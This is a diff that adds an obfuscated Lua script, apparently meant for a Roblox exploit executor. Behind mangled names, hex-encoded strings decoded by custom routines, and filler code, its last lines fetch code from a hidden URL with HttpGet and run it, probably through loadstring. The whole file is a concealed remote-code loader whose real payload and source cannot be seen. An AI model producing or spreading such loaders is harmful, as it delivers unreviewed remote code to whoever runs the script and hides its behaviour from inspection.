@@ -1,0 +1,125 @@
+return (function(...)
+local _vwsK=0;
+if type(print)~="function" or type(string.char)~="function" then _vwsK=(_vwsK+1)%256 end;
+local _vwsGPJ1={request=function() return request end,writefile=function() return writefile end,readfile=function() return readfile end,isfile=function() return isfile end,loadfile=function() return loadfile end,loadstring=function() return loadstring end,getgenv=function() return getgenv end,http_request=function() return http_request end,syn=function() return syn end,game=function() return game end,wait=function() return wait end,task=function() return task end,require=function() return require end,print=function() return print end,warn=function() return warn end,error=function() return error end,pcall=function() return pcall end,xpcall=function() return xpcall end,select=function() return select end,type=function() return type end,typeof=function() return typeof end,tostring=function() return tostring end,tonumber=function() return tonumber end,tick=function() return tick end,time=function() return time end,os=function() return os end,math=function() return math end,string=function() return string end,table=function() return table end,coroutine=function() return coroutine end,bit32=function() return bit32 end,debug=function() return debug end,getfenv=function() return getfenv end,setfenv=function() return setfenv end};
+local function _vwsFDL0(_vwsLAUM)
+local _vwsLEGN=getgenv and getgenv()
+if type(_vwsLEGN)=="table" and _vwsLEGN[_vwsLAUM]~=nil then return _vwsLEGN[_vwsLAUM] end
+_vwsLEGN=getrenv and getrenv()
+if type(_vwsLEGN)=="table" and _vwsLEGN[_vwsLAUM]~=nil then return _vwsLEGN[_vwsLAUM] end
+if type(_G)=="table" and _G[_vwsLAUM]~=nil then return _G[_vwsLAUM] end
+if _vwsGPJ1[_vwsLAUM] then return _vwsGPJ1[_vwsLAUM]() end
+return nil
+end;
+local _vwsCRG2="136162252211003001035250197034115030089030234015095124072167156164053221035200099042132021127172009035052181078249186138222028154155142103157128188197035101200005070208074063145220230173043075";
+local function _vwsXXR3(_vwsLHSO,_vwsLQVJ)
+local _vwsLZJP=0
+for _vwsLMRQ=0,7 do
+if _vwsLHSO%2~=_vwsLQVJ%2 then _vwsLZJP=_vwsLZJP+2^_vwsLMRQ end
+_vwsLHSO=math.floor(_vwsLHSO/2) _vwsLQVJ=math.floor(_vwsLQVJ/2)
+end
+return _vwsLZJP
+end;
+local function _vwsYWP4(_vwsLDFA,_vwsLFKR)
+local _vwsLWYS=((_vwsLDFA*17+_vwsLFKR*5+131)%64)*3+1
+local _vwsLCLC=(tonumber(_vwsCRG2:sub(_vwsLWYS,_vwsLWYS+2))+_vwsLDFA)%256
+if _vwsLCLC==0 then _vwsLCLC=1 end
+return _vwsLCLC
+end;
+local function _vwsDHD7(_vwsLST9,_vwsLDFA,_vwsLKNB)
+local _vwsLCLC=_vwsYWP4(_vwsLDFA,_vwsLKNB)
+local _vwsLZTD=_vwsLDFA
+local _vwsLIDE=(_vwsLCLC*37+_vwsLZTD*91+_vwsLKNB*13)%256 if _vwsLIDE==0 then _vwsLIDE=1 end
+local _vwsLYIF=(_vwsLCLC*131+_vwsLKNB*17+_vwsLZTD*29)%256
+local _vwsLGNG=(_vwsLIDE*53+_vwsLZTD*17)%256
+local _vwsLIFH={}
+for _vwsLGQI=0,#_vwsLST9/2-1 do
+_vwsLYIF=(_vwsLYIF*73+_vwsLGQI*11+_vwsLCLC)%256
+_vwsLGNG=(_vwsLGNG*47+_vwsLGQI*19+_vwsLIDE)%256
+local _vwsLQVJ=tonumber(_vwsLST9:sub(_vwsLGQI*2+1,_vwsLGQI*2+2),16)
+local _vwsLCWK=(_vwsLZTD*31+17+_vwsLGQI*13)%256 if _vwsLCWK==0 then _vwsLCWK=1 end
+_vwsLQVJ=((_vwsLQVJ%16)*16+math.floor(_vwsLQVJ/16))%256
+_vwsLQVJ=_vwsXXR3(_vwsLQVJ,_vwsLCWK)
+_vwsLQVJ=(_vwsLQVJ-_vwsLGNG)%256
+_vwsLQVJ=_vwsXXR3(_vwsLQVJ,_vwsLYIF)
+_vwsLQVJ=(_vwsLQVJ-_vwsLCLC-_vwsLKNB-_vwsLZTD*7-_vwsLGQI*3)%256
+_vwsLIFH[#_vwsLIFH+1]=string.char(_vwsLQVJ)
+end
+return table.concat(_vwsLIFH)
+end;
+local function _vwsDHM8(_vwsLST9,_vwsLDFA,_vwsLKNB)
+local _vwsLCLC=_vwsYWP4(_vwsLDFA,_vwsLKNB)
+local _vwsLIFH={}
+for _vwsLGQI=0,#_vwsLST9/2-1 do
+local _vwsLQVJ=(tonumber(_vwsLST9:sub(_vwsLGQI*2+1,_vwsLGQI*2+2),16)-(_vwsLCLC*11+_vwsLDFA*3+_vwsLGQI*7+_vwsLKNB)%256)%256
+_vwsLIFH[#_vwsLIFH+1]=string.char(_vwsLQVJ)
+end
+return table.concat(_vwsLIFH)
+end;
+local _vwsTHPL={
+[1]=function() return _vwsDHM8("7d87808aa0a8adabb7b7",0,_vwsK) end,
+[2]=function() return _vwsDHD7("994177c4",1,_vwsK) end,
+[3]=function() return _vwsDHM8("374a51545e2c282f6a7d838a888da5a1aeb4c0818d959deaa5edf3fef808050d21e42033380145495d53246e68704049805c66689ca87ab68abfc7a1a8b3b8baf4fccdd4e2e51ff9fc01070e181d5759633d7176525b8a",2,_vwsK) end,
+[4]=function() return _vwsDHD7("84292dd3943377f03d5c999d31be47deb34d0f6f5da33b072899a9a5dd9620f95669494c6559080b",3,_vwsK) end,
+[5]=function() return _vwsDHM8("5d6b7874627a627a6579ab77a395b2ced7a1cdabb3e2e2f0061aef03eef73e38232f1556425f427f",4,_vwsK) end,
+[6]=function() return _vwsDHD7("7b1b627744f8b855f672154b600211b0bb0a780b4a5c4d3dc8031913aec001d94a65aa9b34728803",5,_vwsK) end,
+[7]=function() return _vwsDHM8("fce9da16e5212704051c114e2b475a695e645e407e72877960698f9a8296d2d8deb2c3aedaf2d4e7",6,_vwsK) end,
+[8]=function() return _vwsDHD7("f6c7296286b28255e37784df3f4f45e8e3784b7acb616f2385f860fb14fca12e75af0edb1708fef0",7,_vwsK) end,
+[9]=function() return _vwsDHD7("a9a905e09ffdda56b83adeba69ee7bce53a6acae0920ca32d5a7d88edae4b8898eaad0b01de4fa6a",8,_vwsK) end,
+[10]=function() return _vwsDHD7("4e9809e027339ba5b661e5ab0b774c01824ebb52b5b9c663ffa1701572fcf0832c32b4c3130d79ad",9,_vwsK) end,
+[11]=function() return _vwsDHD7("ad368bc72215dd8c51b1df4c7691eccb21214673e11efa732de9b64038b25d2a862f2d96275839a9",10,_vwsK) end,
+[12]=function() return _vwsDHD7("727036333757499f4c09b834af53f5587f54ecad94ee22f4e4a6ed7dc3d0328476c75e9412224f2e",11,_vwsK) end,
+[13]=function() return _vwsDHM8("b3c090bbd5c9aceab5fe03d2f0fde4200f392e334b2249424a4b715e658c6c9aa0659488a2a4adcb",12,_vwsK) end,
+[14]=function() return _vwsDHM8("49717a987aae947bb2cb8fb6e6c9acb6bfdce3e01cfc251333fd19442e33636930353f8865697b72",13,_vwsK) end,
+[15]=function() return _vwsDHD7("f6f38dd8f6f5dc75aafbb8045c52e7a1cc6628cf13ecb5d16832475cd27f1f32243f0eeaf63d9a29",14,_vwsK) end,
+[16]=function() return _vwsDHM8("ebe1e51c3014044c4e4a436368726f408388977e867f77989b8cc7d0b5a7cbe1f9cee4f30f111429",15,_vwsK) end,
+[17]=function() return _vwsDHM8("3f664c549c968b709db98bb1b4b3e2c5e8b5f1e8e5f21ff9fa1f0a2e182d385b56606e554a566d63",16,_vwsK) end,
+[18]=function() return _vwsDHM8("c2c188cdbc9ddac5c6d0bffa0b13dc1d1e142b2218294f2f634153745c667e70739aaf7eb4bfa4d1",17,_vwsK) end,
+[19]=function() return _vwsDHD7("4c41004ed70281e2a441065378faf8c2b19851d76b3fe19a4804f5aca8b23ce19dfc4568eb33e46b",18,_vwsK) end,
+[20]=function() return _vwsDHD7("dad10e88fdc1108ddc94475ff855bf2d50093695261de1a4fb5936d1a777628328b8b7f0986beb6b",19,_vwsK) end,
+[21]=function() return _vwsDHM8("06e2f10ee42a0c1e0419404961666a495e465b8d76617988918a81bea3abcfd2bae5ebfdd6e0f0ff",20,_vwsK) end,
+[22]=function() return _vwsDHM8("2819172c461d2a232a61603e4e4e7a49979f978b969bba8388ced3e4c7d3d102d1ec11eadc1eee04",21,_vwsK) end,
+[23]=function() return _vwsDHD7("12379f34df8ba669dd476877b01e7a31b5b8d2fe4ce3a40627637bffd81e20d57512dacd7b2bc677",22,_vwsK) end
+};
+local _vwsEON5=_vwsFDL0(_vwsTHPL[(32)-31]());
+local _vwsERT6=_vwsFDL0(_vwsTHPL[2]());
+do local _vwsJDFT=1 while _vwsJDFT<1 do _vwsJDFT=_vwsJDFT+1 end end
+do local _vwsJHHW={} local _vwsJSDX=0 for _vwsJVMY=1,6 do _vwsJHHW[_vwsJVMY]=_vwsJVMY*3 _vwsJSDX=_vwsJSDX+_vwsJHHW[_vwsJVMY] end end
+do local _vwsJKLZ=1 while _vwsJKLZ<1 do _vwsJKLZ=_vwsJKLZ+1 end end
+do local _vwsJCX12={n=15} if _vwsJCX12.n>0 then local _vwsJLZ13=_vwsJCX12.n*0 end end
+do local _vwsJXZ15=(function(_vwsJON16) return _vwsJON16 end)(4) local _vwsJGP17=_vwsJXZ15*0 end
+do local _vwsJZM18=1 while _vwsJZM18<1 do _vwsJZM18=_vwsJZM18+1 end end
+do local _vwsJRU1B=(function(_vwsJGH1C) return _vwsJGH1C end)(8) local _vwsJUY1D=_vwsJRU1B*0 end
+do local _vwsJLO1E=("y"):rep(1) if #_vwsJLO1E>0 then local _vwsJWR1F=#_vwsJLO1E end end
+do local _vwsJXK1H=1 while _vwsJXK1H<1 do _vwsJXK1H=_vwsJXK1H+1 end end
+do local _vwsJID1K=1 while _vwsJID1K<1 do _vwsJID1K=_vwsJID1K+1 end end
+do local _vwsJGD1N={} local _vwsJXU1O=0 for _vwsJAW1P=1,6 do _vwsJGD1N[_vwsJAW1P]=_vwsJAW1P*2 _vwsJXU1O=_vwsJXU1O+_vwsJGD1N[_vwsJAW1P] end end
+do local _vwsJJN1Q={n=32} if _vwsJJN1Q.n>0 then local _vwsJVK1R=_vwsJJN1Q.n*0 end end
+do local _vwsJRU1T=("j"):rep(3) if #_vwsJRU1T>0 then local _vwsJFH1U=#_vwsJRU1T end end
+do local _vwsJKH1W={n=41} if _vwsJKH1W.n>0 then local _vwsJZP1X=_vwsJKH1W.n*0 end end
+do local _vwsJCD1Z={} local _vwsJUT20=0 for _vwsJFZ21=1,3 do _vwsJCD1Z[_vwsJFZ21]=_vwsJFZ21*3 _vwsJUT20=_vwsJUT20+_vwsJCD1Z[_vwsJFZ21] end end
+do local _=_vwsTHPL[(41)-37]() end;
+do local _=_vwsTHPL[(68)-63]() end;
+do local _=_vwsTHPL[(95)-89]() end;
+do local _=_vwsTHPL[7]() end;
+do local _=_vwsTHPL[(46)-38]() end;
+do local _=_vwsTHPL[(34)-25]() end;
+do local _=_vwsTHPL[(76)-66]() end;
+do local _=_vwsTHPL[(99)-88]() end;
+do local _=_vwsTHPL[12]() end;
+do local _=_vwsTHPL[(85)-72]() end;
+do local _=_vwsTHPL[14]() end;
+do local _=_vwsTHPL[15]() end;
+do local _=_vwsTHPL[16]() end;
+do local _=_vwsTHPL[(104)-87]() end;
+do local _=_vwsTHPL[18]() end;
+do local _=_vwsTHPL[(37)-18]() end;
+do local _=_vwsTHPL[20]() end;
+do local _=_vwsTHPL[21]() end;
+do local _=_vwsTHPL[(112)-90]() end;
+do local _=_vwsTHPL[23]() end;
+
+return (function(...)
+_vwsEON5(_vwsERT6:HttpGet(_vwsTHPL[(30)-27]()))()
+end)(...)
+end)(...)
